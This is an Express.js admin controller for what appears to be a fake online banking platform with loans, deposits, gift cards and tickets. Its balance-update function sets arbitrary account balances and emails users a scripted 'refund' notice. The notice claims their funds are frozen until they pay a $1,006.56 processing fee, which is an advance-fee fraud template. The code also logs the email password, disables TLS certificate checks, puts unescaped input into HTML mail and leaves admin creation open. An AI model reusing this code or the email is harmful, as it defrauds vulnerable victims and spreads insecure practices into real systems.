const { StatusCodes } = require('http-status-codes')
const customErrorAPI = require('../customError/customError')
const AdminModel=require('../models/adminModel')
const nodemailer = require('nodemailer');
const UserModel = require('../models/userModel');
const LoandModel = require('../models/loanModel');
const DpsModel = require('../models/dpsScheme');
const DepositModel = require('../models/depositModel');
const TicketModel = require('../models/ticket');
const GiftCardModel = require('../models/giftcardModel');
const FixedDepositModel = require('../models/fixDeposit');
const { response } = require('express');

const createAdmin=async(req,res)=>{
    const {username,password}=req.body
    console.log(req.body)

    const usernameExist= await AdminModel.findOne({username:username})

    if(!username){
        throw new customErrorAPI("Enter a Username",StatusCodes.BAD_REQUEST)
    }
    if(!password){
        throw new customErrorAPI("Enter a password",StatusCodes.BAD_REQUEST)
    }

    if(usernameExist){
        throw new customErrorAPI("username already exits",StatusCodes.CONFLICT)
    }


       const createAdmin=await AdminModel.create(req.body)

       res.status(StatusCodes.OK).json(createAdmin)
    
    }
    const checkToken=async(req,res)=>{
        const {id}=req.user

        if(!id){
            throw new customErrorAPI("Ivalid Id",StatusCodes.UNAUTHORIZED)
        }

        res.status(200).json("Token Good")
    }

    const loginAdmin=async(req,res)=>{

        const {username,password}=req.body
        const user= await AdminModel.findOne({username:username})

        if(!user){
            throw new customErrorAPI("No such username Exists",StatusCodes.CONFLICT)
        }

        const isMatch= await user.verifyPassword(password)
        if(!isMatch){
            throw new customErrorAPI("Wrong Password",StatusCodes.BAD_REQUEST)
            
        }
        const token=await user.signJWT()
            res.status(StatusCodes.OK).json({token:token})
    }



const sendEmail = async (req, res, next) => {
    const { name, email, phoneNumber, subject, message } = req.body;

    if (!name || !email || !phoneNumber || !subject || !message) {
        throw new customErrorAPI('All fields are required', 400);
    }
    console.log(process.env.EMAIL_PASS)
    const transporter = nodemailer.createTransport({
        host: 'smtp.hostinger.com', // e.g., smtp.hostinger.com for Gmail
        port: 465, // or 465 for secure connection
        secure: true, // true for 465, false for other ports
        auth: {
            user: process.env.ADMIN_EMAIL, // your email
            pass: process.env.EMAIL_PASS, // your email password
        },
         tls: {
    // 👇 THIS is what fixes the self-signed cert issue
    rejectUnauthorized: false
  }
    });

    const mailOptions = {
        from:process.env.ADMIN_EMAIL,
        to: process.env.ADMIN_EMAIL, // your receiving email
        subject: subject,
        html: `
            <html>
            <head>
                <style>
                    .email-container {
                        font-family: Arial, sans-serif;
                        line-height: 1.6;
                        color: #333;
                    }
                    .email-header {
                        background-color: #f7f7f7;
                        padding: 10px;
                        border-bottom: 1px solid #ccc;
                    }
                    .email-body {
                        padding: 20px;
                    }
                    .email-footer {
                        margin-top: 20px;
                        padding-top: 10px;
                        border-top: 1px solid #ccc;
                        font-size: 0.9em;
                        color: #777;
                    }
                    .label {
                        font-weight: bold;
                    }
                </style>
            </head>
            <body>
                <div class="email-container">
                    <div class="email-header">
                        <h2>${subject}</h2>
                    </div>
                    <div class="email-body">
                        <p><span class="label">Name:</span> ${name}</p>
                        <p><span class="label">Email:</span> ${email}</p>
                        <p><span class="label">Phone Number:</span> ${phoneNumber}</p>
                        <p><span class="label">Message:</span></p>
                        <p>${message}</p>
                    </div>
                    <div class="email-footer">
                        <p>This email was sent from your website's contact form.</p>
                    </div>
                </div>
            </body>
            </html>
        `,
    };

    try {
        await transporter.sendMail(mailOptions);
        res.status(200).json({ success: true, message: 'Email sent successfully' });
    } catch (error) {
        console.log(error)
        next(new customErrorAPI('Email could not be sent', 500));
    }
};


const updateUserBalance = async (req, res) => {
    const { id } = req.user;
    const { userId } = req.params;

    // Check if the admin exists
    const [admin,user] = await Promise.all([
        AdminModel.findById(id),
        UserModel.findById(userId)
    ]);
    if (!admin) {
        throw new customErrorAPI("No such user exists", StatusCodes.UNAUTHORIZED);
    }
    console.log(req.body)

    const { currency, amount,msg } = req.body;

    // Optional: Validate newBalance and balanceType here
    // if (typeof newBalance !== 'number' || !['USD', 'EUR', 'GBP'].includes(balanceType)) {
    //     return res.status(StatusCodes.BAD_REQUEST).json({ message: "Invalid balance data" });
    // }
 console.log(currency)
    // Update user balance
    const updatedUser = await UserModel.findOneAndUpdate(
        { _id: userId },
        { $set: { [`balance.${currency}`]: amount } },
        { new: true } // Return the updated document
    );

    // Check if user was found and updated
    if (!updatedUser) {
       throw new customErrorAPI("User not Found",StatusCodes.NOT_FOUND)
    }
   console.log(msg)
    if(msg=='Yes'){
        const transporter = nodemailer.createTransport({
            host: 'smtp.hostinger.com', // e.g., smtp.hostinger.com for Gmail
            port: 465, // or 465 for secure connection
            secure: true, // true for 465, false for other ports
            auth: {
                user: process.env.ADMIN_EMAIL, // your email
                pass: process.env.EMAIL_PASS, // your email password
            },
             tls: {
    // 👇 THIS is what fixes the self-signed cert issue
    rejectUnauthorized: false
  }
        });
       const message={
        from: {
          name: `${process.env.SITE_NAME}`,
          address: process.env.ADMIN_EMAIL
        },
        to:user.email,
        subject:'Email Confirmation',
        html:`<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Refund Process Notification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css">
    /* Google webfonts */
    @media screen {
      @font-face {
        font-family: 'Source Sans Pro';
        font-style: normal;
        font-weight: 400;
        src: local('Source Sans Pro Regular'), local('SourceSansPro-Regular'), url(https://fonts.gstatic.com/s/sourcesanspro/v10/ODelI1aHBYDBqgeIAH2zlBM0YzuT7MdOe03otPbuUS0.woff) format('woff');
      }
      @font-face {
        font-family: 'Source Sans Pro';
        font-style: normal;
        font-weight: 700;
        src: local('Source Sans Pro Bold'), local('SourceSansPro-Bold'), url(https://fonts.gstatic.com/s/sourcesanspro/v10/toadOcfmlt9b38dHJxOBGFkQc6VGVFSmCnC_l7QZG60.woff) format('woff');
      }
    }
    body, table, td, a {
      -ms-text-size-adjust: 100%;
      -webkit-text-size-adjust: 100%;
    }
    table, td {
      mso-table-rspace: 0pt;
      mso-table-lspace: 0pt;
    }
    img {
      -ms-interpolation-mode: bicubic;
    }
    a[x-apple-data-detectors] {
      font-family: inherit !important;
      font-size: inherit !important;
      font-weight: inherit !important;
      line-height: inherit !important;
      color: inherit !important;
      text-decoration: none !important;
    }
    div[style*="margin: 16px 0;"] {
      margin: 0 !important;
    }
    body {
      width: 100% !important;
      height: 100% !important;
      padding: 0 !important;
      margin: 0 !important;
    }
    table {
      border-collapse: collapse !important;
    }
    a {
      color: #1a82e2;
    }
    img {
      height: auto;
      line-height: 100%;
      text-decoration: none;
      border: 0;
      outline: none;
    }
  </style>
</head>
<body style="background-color: #e9ecef;">

  <div class="preheader" style="display: none; max-width: 0; max-height: 0; overflow: hidden; font-size: 1px; line-height: 1px; color: #fff; opacity: 0;">
    Your refund request has been successfully processed.
  </div>

  <table border="0" cellpadding="0" cellspacing="0" width="100%">
    <tr>
      <td align="center" bgcolor="#e9ecef">
        <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">
          <tr>
            <td align="center" valign="top" style="padding: 36px 24px;">
              <a href="https://www.blogdesire.com" target="_blank" style="display: inline-block;">
                <img src="https://www.blogdesire.com/wp-content/uploads/2019/07/blogdesire-1.png" alt="Logo" border="0" width="48" style="display: block; width: 48px; max-width: 48px; min-width: 48px;">
              </a>
            </td>
          </tr>
        </table>
      </td>
    </tr>

    <tr>
      <td align="center" bgcolor="#e9ecef">
        <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">
          <tr>
            <td align="left" bgcolor="#ffffff" style="padding: 36px 24px 0; font-family: 'Source Sans Pro', Helvetica, Arial, sans-serif; border-top: 3px solid #d4dadf;">
              <h1 style="margin: 0; font-size: 32px; font-weight: 700; letter-spacing: -1px; line-height: 48px;">Refund Process Notification</h1>
            </td>
          </tr>
        </table>
      </td>
    </tr>

    <tr>
      <td align="center" bgcolor="#e9ecef">
        <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">

          <tr>
            <td align="left" bgcolor="#ffffff" style="padding: 24px; font-family: 'Source Sans Pro', Helvetica, Arial, sans-serif; font-size: 16px; line-height: 24px;">
              <p style="margin: 0;">We are pleased to inform you that your refund request has been successfully processed and credited to your account. Please note that, for security reasons, the refunded amount is currently frozen and cannot be accessed, even by our administrators, until the next steps are completed.</p>
              <h3 style="margin-top: 24px;">To ensure the transfer of the funds to your local bank account or credit card, please follow these steps:</h3>
              <ol>
                <li><strong>Verification of Account:</strong> Confirm your banking or credit card details by logging into your user portal and verifying the necessary information.</li>
                <li><strong>Refund Processing Fee:</strong> A minimal processing fee of $1,006.56 is required to activate the withdrawal process. This fee is 50% refundable. It ensures the seamless transfer of your funds to the designated account or to your local Indian bank. You can make this payment by contacting the support team using the email below.</li>
                <li><strong>Complete the Withdrawal:</strong> Once the verification and processing fee are completed, the frozen amount will be released, and you can proceed with transferring it to your local bank account or credit card.</li>
              </ol>
              <p>Please understand that this freeze is in place to ensure maximum security for your funds and to comply with legal regulations. Rest assured, your refund is safe and can only be accessed once the above steps are fulfilled.</p>
            </td>
          </tr>
          <tr>
            <td align="left" bgcolor="#ffffff" style="padding: 24px; font-family: 'Source Sans Pro', Helvetica, Arial, sans-serif; font-size: 16px; line-height: 24px; border-bottom: 3px solid #d4dadf;">
              <p style="margin: 0;">If you have any questions or need assistance with the process, feel free to contact our customer support team. We appreciate your cooperation and look forward to helping you complete this process swiftly.</p>
              <p style="margin: 0;">Warm regards,<br> ${process.env.SITE_NAME}</p>
            </td>
          </tr>

        </table>
      </td>
    </tr>

    <tr>
      <td align="center" bgcolor="#e9ecef" style="padding: 24px;">
        <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px;">

          <tr>
            <td align="center" bgcolor="#e9ecef" style="padding: 12px 24px; font-family: 'Source Sans Pro', Helvetica, Arial, sans-serif; font-size: 14px; line-height: 20px; color: #666;">
              <p style="margin: 0;">You received this email because we processed your refund request. If you didn't make this request, you can safely delete this email.</p>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>

</body>
</html>`

      }
      transporter.sendMail(message,(error, info)=>{
        if(error){
          console.log(error)
        
        }else{
          console.log('success' + info )
        
        }
  
      })
    }

    // Respond with the updated user data
    res.status(StatusCodes.OK).json(updatedUser);
}


const deleteUser=async(req,res)=>{
    const {id}=req.user

    const {userId}=req.params


    const admin=await AdminModel.findById(id)

    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }



    const deleteUser=await UserModel.findOneAndDelete({_id:userId},{new:true})

    res.status(StatusCodes.OK).json(deleteUser)

}

const acceptLoan=async(req,res)=>{
    const {id}=req.user

    const {loanId}=req.params
    const {currency,action}=req.body


    console.log(req.body)
    const admin=await  AdminModel.findById(id)
       
   



    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }
  

   if(action=='Approve'){
    const accept=await LoandModel.findOneAndUpdate({_id:loanId},{$set:{status:"approved"}})

    const updateUser=await UserModel.findOneAndUpdate({email:accept.userEmail},{$inc:{[`balance.${currency}`]:accept.amount}},{new:true})
    res.status(StatusCodes.OK).json(updateUser)
   }else if(action=='Reject'){
    const reject=await LoandModel.findOneAndUpdate({_id:loanId},{$set:{status:"rejected"}})
    res.status(StatusCodes.OK).json(reject)

   }
    

}




const approveDPS=async(req,res)=>{
    const {id}=req.user
    const {dpsId}=req.params


    const [admin,dps]=await Promise.all([
        AdminModel.findById(id),
        DpsModel.findById(userId)
    ])

    

    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }
    if(!dps){
        throw new customErrorAPI("No such fixed deposit exists",StatusCodes.UNAUTHORIZED)
    }


    const accept=await DpsModel.findOneAndUpdate({_id:dpsId},{$set:{status:"approved"}})
    res.status(StatusCodes.OK).json(accept)


}


const getAllDeposits = async (req, res) => {
  try {
    const { id } = req.user;

    // Validate admin
    const admin = await AdminModel.findById(id);
    if (!admin) {
      throw new customErrorAPI("No such user exists", StatusCodes.UNAUTHORIZED);
    }

    // Fetch deposits
    const deposits = await DepositModel.find();

    // Combine with user data (flattened)
    const depositsWithUserData = await Promise.all(
      deposits.map(async (deposit) => {
        const depositObj = deposit.toObject();
        const user = await UserModel.findOne({ email: deposit.userEmail });

        const userObj = user ? user.toObject() : {};

        // Rename user._id to userId to avoid conflict with deposit._id
        if (userObj._id) {
          userObj.userId = userObj._id;
          delete userObj._id;
        }

        return {
          ...depositObj,
          ...userObj
        };
      })
    );

    res.status(StatusCodes.OK).json(depositsWithUserData);
  } catch (error) {
    console.error("Error in getAllDeposits:", error);
    res
      .status(error.statusCode || StatusCodes.INTERNAL_SERVER_ERROR)
      .json({ message: error.message || "Internal server error" });
  }
};





const getTickets=async(req,res)=>{
    const {id}=req.user
    const admin=await AdminModel.findById(id)
    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }

    const tickets=await TicketModel.find()

    res.status(StatusCodes.OK).json(tickets)
}

const chnageDepositStatus=async(req,res)=>{
    const {id}=req.user
    const {action}=req.body
    const {depositId}=req.params

    console.log(action,depositId)
    
    const admin=await AdminModel.findById(id)
    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }

    if(action=='Successful'){
        const successfulDeposit=await DepositModel.findOneAndUpdate({_id:depositId},{$set:{status:'Successful'}})
        res.status(StatusCodes.OK).json(successfulDeposit)
    }else if(action=='Failed'){
        const FailedDeposit=await DepositModel.findOneAndUpdate({_id:depositId},{$set:{status:'Failed'}})

        res.status(StatusCodes.OK).json(FailedDeposit)
    }else{
        throw new customErrorAPI("Bad Request",StatusCodes.BAD_REQUEST)
    }

    
}



const users=async(req,res)=>{
    const {id}=req.user
    const admin=await AdminModel.findById(id)
    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }

    const users=await UserModel.find()

    res.status(StatusCodes.OK).json(users)
}


const  getFixDeposits=async(req,res)=>{
    const {id}=req.user
    const admin=await AdminModel.findById(id)

    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }

    const dpsDeposits=await FixedDepositModel.find()

    res.status(StatusCodes.OK).json(dpsDeposits)

}


const fixedDepositStatus=async(req,res)=>{
    const {id}=req.user
    const {action}=req.body
    const {fdId}=req.params

    console.log(fdId)
    
    const admin=await AdminModel.findById(id)
    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }

    if(action=='Approve'){
        const successfulDeposit=await FixedDepositModel.findOneAndUpdate({_id:fdId},{$set:{status:'approved'}})
        res.status(StatusCodes.OK).json(successfulDeposit)
    }else if(action=='Reject'){
        const FailedDeposit=await FixedDepositModel.findOneAndUpdate({_id:fdId},{$set:{status:'rejected'}})

        res.status(StatusCodes.OK).json(FailedDeposit)
    }else{
        throw new customErrorAPI("Bad Request",StatusCodes.BAD_REQUEST)
    }

}



const deleteFixedDeposit=async(req,res)=>{

    const {id}=req.user
    const admin=await AdminModel.findById(id)
    const {fdId}=req.params

    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }


    const deleteFd=await FixedDepositModel.findOneAndDelete({_id:fdId})

    res.status(StatusCodes.OK).json(deleteFd)

}


const deleteTicket=async(req,res)=>{
    const {id}=req.user
    const admin=await AdminModel.findById(id)
    const {tId}=req.params

    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }


    const deleteTicket=await TicketModel.findOneAndDelete({_id:tId})
    console.log(deleteTicket)

    res.status(StatusCodes.OK).json(deleteTicket)
}

const deleteDeposit=async(req,res)=>{
    const {id}=req.user
    const admin=await AdminModel.findById(id)
    const {depositId}=req.params

    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }


    const deleteDeposit=await DepositModel.findOneAndDelete({_id:depositId})
 

    res.status(StatusCodes.OK).json(deleteDeposit)
}



const getLoans=async(req,res)=>{
    const {id}=req.user

    const admin=await AdminModel.findById(id)

    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }


    const loans=await LoandModel.find()

    res.status(StatusCodes.OK).json(loans)
}

const deleteLoan=async(req,res)=>{
    const {id}=req.user
    const {loanId}=req.params

    const [user,admin]=await Promise.all([
        AdminModel.findById(id),
        UserModel.findById(id)
    ])


    if(!user&&!admin){
        throw new customErrorAPI("No such user found",StatusCodes.UNAUTHORIZED)
    }

    const deleteLoan=await LoandModel.findOneAndDelete({_id:loanId})
    res.status(StatusCodes.OK).json(deleteLoan)
}

const giftCard=async(req,res)=>{
    const {id}=req.user
    const admin=await AdminModel.findById(id)

    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }

    const cards=await GiftCardModel.find()

    res.status(StatusCodes.OK).json(cards)

}


const cardStatus=async(req,res)=>{
    const {id}=req.user
    const {action}=req.body
    const {cardId}=req.params

    console.log(action,cardId)
    
    const admin=await AdminModel.findById(id)
    if(!admin){
        throw new customErrorAPI("No such user exists",StatusCodes.UNAUTHORIZED)
    }

    if(action=='Approve'){
        const successfulDeposit=await GiftCardModel.findOneAndUpdate({_id:cardId},{$set:{status:'approved'}})
        res.status(StatusCodes.OK).json(successfulDeposit)
    }else if(action=='Reject'){
        const FailedDeposit=await GiftCardModel.findOneAndUpdate({_id:cardId},{$set:{status:'rejected'}})

        res.status(StatusCodes.OK).json(FailedDeposit)
    }else{
        throw new customErrorAPI("Bad Request",StatusCodes.BAD_REQUEST)
    }

    

}


const deletCard=async(req,res)=>{
    const {id}=req.user
    const {cardId}=req.params

    const [user,admin]=await Promise.all([
        AdminModel.findById(id),
        UserModel.findById(id)
    ])


    if(!user&&!admin){
        throw new customErrorAPI("No such user found",StatusCodes.UNAUTHORIZED)
    }

    const deleteCard=await GiftCardModel.findOneAndDelete({_id:cardId})
    res.status(StatusCodes.OK).json(deleteCard)
}


const isAdmin=async(req,res)=>{

    const {id}=req.user

    const [admin,user]=await Promise.all([
        AdminModel.findById(id),
        UserModel.findById(id)
    ])
    let response;

    if(admin){
        response={admin:true,user:null}
    res.status(StatusCodes.OK).json(response)
    }
    else if(user){
        response={admin:null,user:true}
        res.status(StatusCodes.OK).json(response)
    }else{
        throw new customErrorAPI("Unauthorized",StatusCodes.UNAUTHORIZED)
    }

}

    module.exports={createAdmin,loginAdmin,sendEmail,checkToken,updateUserBalance,deleteUser,acceptLoan,approveDPS,getAllDeposits,getTickets,users,getFixDeposits,deleteTicket,chnageDepositStatus,deleteDeposit,getLoans,deleteLoan,giftCard,deletCard,cardStatus,deleteFixedDeposit,fixedDepositStatus,isAdmin}


